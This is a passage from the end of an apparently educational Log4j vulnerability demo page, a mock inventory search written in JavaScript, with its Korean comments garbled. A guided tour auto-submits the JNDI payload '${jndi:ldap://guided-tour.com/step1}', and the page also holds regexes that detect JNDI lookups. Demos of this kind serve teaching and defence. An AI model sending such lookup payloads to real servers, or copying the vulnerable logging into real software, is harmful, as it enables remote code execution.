          `/api/boards/search?q=${encodeURIComponent(
            searchTerm
          )}&type=inventory`
        )
          .then((response) => response.json())
          .then((data) => {
            updateSearchResults(data, searchTerm);

            // JNDI íŒ¨í„´ ê°ì§€
            if (detectJNDIPattern(searchTerm)) {
              showVulnerabilityAlert(searchTerm);
              addLogEntry(
                `[ë³´ì•ˆê²½ê³ ] JNDI íŒ¨í„´ ê°ì§€: ${searchTerm}`,
                'warning'
              );
            }
          })
          .catch((error) => {
            console.error('ê²€ìƒ‰ ì˜¤ë¥˜:', error);
            addLogEntry(`[ì˜¤ë¥˜] ê²€ìƒ‰ ì‹¤íŒ¨: ${error.message}`, 'error');

            // ì„ì‹œ ê²°ê³¼ í‘œì‹œ
            showMockResults(searchTerm);
          });
      }

      // ğŸš¨ ê³ ê¸‰ ê²€ìƒ‰ (ì—¬ëŸ¬ í•„í„° ì¡°í•©)
      function performAdvancedSearch() {
        const filters = {
          category: document.getElementById('categoryFilter').value,
          stock: document.getElementById('stockFilter').value,
          supplier: document.getElementById('supplierFilter').value,
          priceMin: document.getElementById('priceMin').value,
          priceMax: document.getElementById('priceMax').value,
        };

        addLogEntry('[ê³ ê¸‰ê²€ìƒ‰] í•„í„° ì ìš© ì¤‘...');

        // ğŸš¨ Log4j ì·¨ì•½ì : í•„í„° ê°’ë“¤ì„ ì¡°í•©í•˜ì—¬ ë¡œê¹…
        const filterString = Object.entries(filters)
          .filter(([key, value]) => value)
          .map(([key, value]) => `${key}:${value}`)
          .join(', ');

        fetch('/api/boards/search/advanced', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(filters),
        })
          .then((response) => response.json())
          .then((data) => {
            addLogEntry(`[ê³ ê¸‰ê²€ìƒ‰] í•„í„°: ${filterString}`);
            updateSearchResults(data, 'ê³ ê¸‰ê²€ìƒ‰');
          })
          .catch((error) => {
            addLogEntry(`[ì˜¤ë¥˜] ê³ ê¸‰ê²€ìƒ‰ ì‹¤íŒ¨: ${error.message}`, 'error');
            showMockResults('ê³ ê¸‰ê²€ìƒ‰');
          });
      }

      // ê³µê²© íŒ¨í„´ ì‚½ì…
      function insertAttackPattern(pattern) {
        document.getElementById('mainSearchInput').value = pattern;

        // ìë™ ê²€ìƒ‰ ì‹¤í–‰
        setTimeout(() => {
          performMainSearch();
        }, 500);

        addLogEntry(`[íŒ¨í„´ì‚½ì…] ${pattern.substring(0, 50)}...`, 'warning');
      }

      // ë¹ ë¥¸ ê²€ìƒ‰
      function quickSearch(term) {
        document.getElementById('mainSearchInput').value = term;
        performMainSearch();
      }

      // JNDI íŒ¨í„´ ê°ì§€
      function detectJNDIPattern(input) {
        const jndiPatterns = [
          /\$\{jndi:/i,
          /ldap:\/\//i,
          /rmi:\/\//i,
          /dns:\/\//i,
          /\$\{.*:.*\}/i,
        ];

        return jndiPatterns.some((pattern) => pattern.test(input));
      }

      // ì·¨ì•½ì  ê²½ê³  í‘œì‹œ
      function showVulnerabilityAlert(input) {
        const alertHtml = `
                <div class="alert alert-danger alert-dismissible fade show" role="alert">
                    <div class="row align-items-center">
                        <div class="col-md-8">
                            <h6 class="fw-bold mb-1">
                                <i class="fas fa-exclamation-triangle me-2"></i>
                                Log4j ì·¨ì•½ì  íŒ¨í„´ ê°ì§€!
                            </h6>
                            <p class="mb-1">ì…ë ¥ëœ ê²€ìƒ‰ì–´ì—ì„œ JNDI íŒ¨í„´ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p>
                            <small>íŒ¨í„´: <code>${input.substring(0, 100)}${
          input.length > 100 ? '...' : ''
        }</code></small>
                        </div>
                        <div class="col-md-4 text-end">
                            <button class="btn btn-outline-danger btn-sm" onclick="showAttackGuide()">
                                <i class="fas fa-info-circle me-1"></i>ìƒì„¸ ì •ë³´
                            </button>
                        </div>
                    </div>
                    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                </div>
            `;

        const container = document.querySelector('.container');
        container.insertAdjacentHTML('afterbegin', alertHtml);
      }

      // ì‹¤ì‹œê°„ ê²€ìƒ‰ ì„¤ì •
      function setupRealTimeSearch() {
        const searchInput = document.getElementById('mainSearchInput');
        let timeout;

        searchInput.addEventListener('input', function (e) {
          clearTimeout(timeout);
          const value = e.target.value;

          if (value.length > 2) {
            timeout = setTimeout(() => {
              addLogEntry(`[ì‹¤ì‹œê°„] ì…ë ¥: "${value}"`);

              // JNDI íŒ¨í„´ ì‹¤ì‹œê°„ ê°ì§€
              if (detectJNDIPattern(value)) {
                addLogEntry(`[ì‹¤ì‹œê°„ê²½ê³ ] JNDI íŒ¨í„´ ê°ì§€ì¤‘...`, 'warning');
              }
            }, 500);
          }
        });

        // ì—”í„°í‚¤ ê²€ìƒ‰
        searchInput.addEventListener('keypress', function (e) {
          if (e.key === 'Enter') {
            performMainSearch();
          }
        });
      }

      // ë¡œê·¸ ì¶”ê°€
      function addLogEntry(message, type = 'info') {
        const logMonitor = document.getElementById('logMonitor');
        const timestamp = new Date().toLocaleTimeString();
        const className =
          type === 'warning'
            ? 'text-warning'
            : type === 'error'
            ? 'text-danger'
            : 'text-success';

        const logEntry = document.createElement('div');
        logEntry.className = className;
        logEntry.innerHTML = `[${timestamp}] ${message}`;

        logMonitor.appendChild(logEntry);
        logMonitor.scrollTop = logMonitor.scrollHeight;

        // ë¡œê·¸ ê°œìˆ˜ ì œí•œ
        if (logMonitor.children.length > 50) {
          logMonitor.removeChild(logMonitor.firstChild);
        }
      }

      // ë¡œê·¸ ì‹œë®¬ë ˆì´ì…˜
      function startLogSimulation() {
        const simulationMessages = [
          'Log4j vulnerability demo system ready',
          'Search monitoring active',
          'JNDI pattern detection enabled',
          'Real-time logging initialized',
        ];

        simulationMessages.forEach((msg, index) => {
          setTimeout(() => {
            addLogEntry(msg);
          }, index * 1000);
        });
      }

      // ëª¨ì˜ ê²°ê³¼ í‘œì‹œ
      function showMockResults(searchTerm) {
        document.getElementById('resultCount').textContent = '3';
        addLogEntry(`[ê²°ê³¼] "${searchTerm}" ê²€ìƒ‰ ì™„ë£Œ - 3ê±´ ë°œê²¬`);

        // ì·¨ì•½ì  íŒ¨í„´ì¸ ê²½ìš° íŠ¹ë³„ ì²˜ë¦¬
        if (detectJNDIPattern(searchTerm)) {
          addLogEntry('[ì·¨ì•½ì ] JNDI ë£©ì—… ì‹œë„ê°€ ë¡œê¹…ë˜ì—ˆìŠµë‹ˆë‹¤', 'warning');
          addLogEntry(
            '[ì·¨ì•½ì ] ì‹¤ì œ í™˜ê²½ì—ì„œëŠ” ì™¸ë¶€ ì„œë²„ ì—°ê²°ì´ ë°œìƒí•©ë‹ˆë‹¤',
            'warning'
          );
        }
      }

      // ê²€ìƒ‰ ê²°ê³¼ ì—…ë°ì´íŠ¸
      function updateSearchResults(data, searchTerm) {
        if (data && data.content) {
          document.getElementById('resultCount').textContent =
            data.totalElements || 0;
          addLogEntry(
            `[ê²°ê³¼] "${searchTerm}" ê²€ìƒ‰ ì™„ë£Œ - ${
              data.totalElements || 0
            }ê±´ ë°œê²¬`
          );
        } else {
          showMockResults(searchTerm);
        }
      }

      // ëª¨ë‹¬ ë° ê¸°íƒ€ í•¨ìˆ˜ë“¤
      function showAttackGuide() {
        new bootstrap.Modal(document.getElementById('attackGuideModal')).show();
      }

      function toggleLogMonitor() {
        const logMonitor = document.getElementById('logMonitor');
        logMonitorVisible = !logMonitorVisible;
        logMonitor.style.display = logMonitorVisible ? 'block' : 'none';

        addLogEntry(
          logMonitorVisible ? 'ë¡œê·¸ ëª¨ë‹ˆí„° í™œì„±í™”' : 'ë¡œê·¸ ëª¨ë‹ˆí„° ë¹„í™œì„±í™”'
        );
      }

      function clearLogs() {
        document.getElementById('logMonitor').innerHTML = '';
        addLogEntry('ë¡œê·¸ ëª¨ë‹ˆí„° ì´ˆê¸°í™”ë¨');
      }

      function resetFilters() {
        document.getElementById('categoryFilter').value = '';
        document.getElementById('stockFilter').value = '';
        document.getElementById('supplierFilter').value = '';
        document.getElementById('priceMin').value = '';
        document.getElementById('priceMax').value = '';
        addLogEntry('[í•„í„°] ëª¨ë“  í•„í„° ì´ˆê¸°í™”');
      }

      function sortResults(type) {
        addLogEntry(`[ì •ë ¬] ${type} ê¸°ì¤€ìœ¼ë¡œ ì •ë ¬`);
        // ì‹¤ì œ ì •ë ¬ ë¡œì§ì€ ì—¬ê¸°ì— êµ¬í˜„
      }

      function startGuidedTour() {
        bootstrap.Modal.getInstance(
          document.getElementById('attackGuideModal')
        ).hide();

        // ê°€ì´ë“œ íˆ¬ì–´ ì‹œì‘
        alert('ê°€ì´ë“œ íˆ¬ì–´ë¥¼ ì‹œì‘í•©ë‹ˆë‹¤. ì²« ë²ˆì§¸ ê³µê²© íŒ¨í„´ì„ í…ŒìŠ¤íŠ¸í•´ë³´ì„¸ìš”!');
        insertAttackPattern('${jndi:ldap://guided-tour.com/step1}');
      }

      // ì‹¤ì‹œê°„ ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ ì‹œë®¬ë ˆì´ì…˜
      setInterval(function () {
        if (Math.random() < 0.1) {
          // 10% í™•ë¥ ë¡œ ë³´ì•ˆ ì´ë²¤íŠ¸ ì‹œë®¬ë ˆì´ì…˜
          const events = [
            'Suspicious search pattern detected',
            'Multiple JNDI attempts from same IP',
            'Potential vulnerability scan detected',
            'Log4j pattern analysis completed',
          ];
          const randomEvent = events[Math.floor(Math.random() * events.length)];
          addLogEntry(`[ë³´ì•ˆ] ${randomEvent}`, 'warning');
        }
      }, 15000); // 15ì´ˆë§ˆë‹¤ ì²´í¬
    </script>
  </body>
</html>
